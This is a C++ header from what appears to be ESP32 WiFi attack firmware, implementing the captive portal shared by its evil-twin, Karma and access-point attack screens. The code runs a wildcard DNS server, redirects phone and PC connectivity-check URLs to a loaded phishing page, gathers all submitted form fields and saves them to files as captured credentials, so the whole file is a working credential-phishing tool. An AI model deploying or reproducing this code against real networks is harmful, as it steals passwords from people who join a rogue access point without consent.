#pragma once

#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <WiFi.h>
#include "core/Device.h"
#include "core/IStorage.h"
#include "ui/actions/InputSelectOption.h"
#include "ui/actions/ShowStatusAction.h"
#include "utils/StorageUtil.h"

// Shared captive portal server used by EvilTwin, Karma, and AP screens.
// Handles: portal selection, HTML loading, web server setup, credential capture.
class CaptivePortalServer {
public:
  using VisitCallback = void (*)(void* ctx);
  using PostCallback  = void (*)(const String& data, void* ctx);

  void setCallbacks(VisitCallback onVisit, PostCallback onPost, void* ctx) {
    _onVisit = onVisit;
    _onPost  = onPost;
    _ctx     = ctx;
  }

  // ── Portal Selection ─────────────────────────────────────

  // Show portal folder picker. Returns true if selected, folder stored in portalFolder().
  bool selectPortal() {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
      ShowStatusAction::show("No storage available");
      return false;
    }

    IStorage::DirEntry entries[MAX_PORTALS];
    uint8_t count = Uni.Storage->listDir(PORTALS_DIR, entries, MAX_PORTALS);

    InputSelectAction::Option opts[MAX_PORTALS];
    int optCount = 0;
    for (uint8_t i = 0; i < count && optCount < MAX_PORTALS; i++) {
      if (entries[i].isDir) {
        _portalNamesBuf[optCount] = entries[i].name;
        opts[optCount] = {_portalNamesBuf[optCount].c_str(), _portalNamesBuf[optCount].c_str()};
        optCount++;
      }
    }

    if (optCount == 0) {
      ShowStatusAction::show("No portals found\nWiFi > Network > Download\n> Firmware Sample Files");
      return false;
    }

    const char* selected = InputSelectAction::popup("Captive Portal", opts, optCount);
    if (!selected) return false;

    _portalFolder = selected;
    return true;
  }

  const String& portalFolder() const { return _portalFolder; }
  void setPortalFolder(const String& folder) { _portalFolder = folder; }

  // ── Portal HTML Loading ──────────────────────────────────

  void loadPortalHtml() {
    _portalBasePath = "";
    _portalHtml     = "";
    _successHtml    = "";

    if (_portalFolder.isEmpty() || !Uni.Storage || !Uni.Storage->isAvailable()) return;

    _portalBasePath = String(PORTALS_DIR) + "/" + _portalFolder;

    // Try index.htm first, then index.html
    String indexPath = _portalBasePath + "/index.htm";
    if (!Uni.Storage->exists(indexPath.c_str())) {
      indexPath = _portalBasePath + "/index.html";
      if (!Uni.Storage->exists(indexPath.c_str())) {
        _portalBasePath = "";
        return;
      }
    }

    _portalHtml = Uni.Storage->readFile(indexPath.c_str());

    String successPath = _portalBasePath + "/success.htm";
    if (Uni.Storage->exists(successPath.c_str())) {
      _successHtml = Uni.Storage->readFile(successPath.c_str());
    } else {
      _successHtml = "<html><body><h2>Connected!</h2></body></html>";
    }
  }

  const String& portalHtml()  const { return _portalHtml; }
  const String& successHtml() const { return _successHtml; }

  // ── Web Server ───────────────────────────────────────────

  // Start captive portal web server with DNS. Returns the AsyncWebServer* for
  // callers that need to add extra routes (e.g. /status for password checking).
  AsyncWebServer* start(IPAddress apIP) {
    _dns = new DNSServer();
    _dns->start(53, "*", apIP);

    _server = new AsyncWebServer(80);

    auto redirectToRoot = [](AsyncWebServerRequest* req) {
      req->redirect("/");
    };

    _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
      _visitCount++;
      if (_onVisit) _onVisit(_ctx);
      _servePortal(req);
    });
    _server->on("/generate_204",       HTTP_GET, redirectToRoot);
    _server->on("/fwlink",             HTTP_GET, redirectToRoot);
    _server->on("/hotspot-detect.html", HTTP_GET, redirectToRoot);
    _server->on("/connecttest.txt",    HTTP_GET, redirectToRoot);

    _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
      String data;
      for (int i = 0; i < (int)req->params(); i++) {
        const AsyncWebParameter* p = req->getParam(i);
        if (!p->isPost()) continue;
        if (data.length() > 0) data += "\n";
        data += p->name() + "=" + p->value();
      }
      _postCount++;
      if (_onPost) _onPost(data, _ctx);
      req->send(200, "text/html", _successHtml.length() > 0
        ? _successHtml : String("<html><body><h2>Connected!</h2></body></html>"));
    });

    // Serve static files from portal folder
    if (Uni.Storage && Uni.Storage->isAvailable() && !_portalBasePath.isEmpty()) {
      _server->serveStatic("/", Uni.Storage->getFS(), _portalBasePath.c_str());
    }

    _server->onNotFound([](AsyncWebServerRequest* req) {
      req->redirect("/");
    });

    _server->begin();
    return _server;
  }

  void stop() {
    if (_server) {
      _server->end();
      delete _server;
      _server = nullptr;
    }
    if (_dns) {
      _dns->stop();
      delete _dns;
      _dns = nullptr;
    }
    _visitCount     = 0;
    _postCount      = 0;
  }

  // Call when fully done (e.g. stopping the attack) to free portal HTML memory
  void reset() {
    stop();
    _portalHtml     = "";
    _successHtml    = "";
    _portalBasePath = "";
  }

  void processDns() {
    if (_dns) _dns->processNextRequest();
  }

  AsyncWebServer* server() { return _server; }
  DNSServer*      dns()    { return _dns; }

  int visitCount() const { return _visitCount; }
  int postCount()  const { return _postCount; }

  // ── Credential Saving ────────────────────────────────────

  void saveCaptured(const String& data, const String& identifier) {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
    if (!StorageUtil::hasSpace()) return;

    Uni.Storage->makeDir("/unigeek/wifi/captives");
    String filename = "/unigeek/wifi/captives/" + identifier + ".txt";

    fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
    if (f) {
      f.println("---");
      f.println(data);
      f.close();
    }
  }

private:
  static constexpr const char* PORTALS_DIR = "/unigeek/wifi/portals";
  static constexpr int MAX_PORTALS = 10;

  String _portalFolder;
  String _portalBasePath;
  String _portalHtml;
  String _successHtml;
  String _portalNamesBuf[MAX_PORTALS];

  DNSServer*      _dns    = nullptr;
  AsyncWebServer* _server = nullptr;

  VisitCallback _onVisit = nullptr;
  PostCallback  _onPost  = nullptr;
  void*         _ctx     = nullptr;

  int _visitCount = 0;
  int _postCount  = 0;

  void _servePortal(AsyncWebServerRequest* req) {
    if (_portalHtml.length() > 0)
      req->send(200, "text/html", _portalHtml);
    else
      req->send(200, "text/html", "<html><body><h2>Connected</h2></body></html>");
  }
};
